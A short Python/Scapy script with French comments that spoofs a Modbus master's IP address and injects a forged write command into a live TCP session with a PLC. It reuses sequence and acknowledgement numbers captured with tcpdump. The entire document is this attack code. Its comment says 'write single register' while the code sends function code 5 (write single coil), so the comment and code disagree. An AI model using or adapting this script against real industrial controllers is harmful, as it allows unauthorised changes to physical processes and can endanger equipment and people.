from scapy.all import *
import struct

# Infos captées depuis tcpdump
ip_master = "192.168.1.60"
ip_plc = "192.168.1.20"
sport = 12345          # Port TCP du maître
dport = 502
seq_num = 100000       # Remplace par la séquence correcte
ack_num = 200000       # idem

# Paquet Modbus TCP : write single register
transaction_id = 0x0001
protocol_id = 0x0000
length = 6  # bytes that follow
unit_id = 1
function_code = 5
register_address = 0x000A
register_value = 0x0019

payload = struct.pack(">HHHBBHH",
    transaction_id,
    protocol_id,
    length,
    unit_id,
    function_code,
    register_address,
    register_value
)

# Construction du paquet TCP/IP
ip = IP(src=ip_master, dst=ip_plc)
tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
packet = ip / tcp / Raw(load=payload)

# Injection
send(packet, verbose=1)
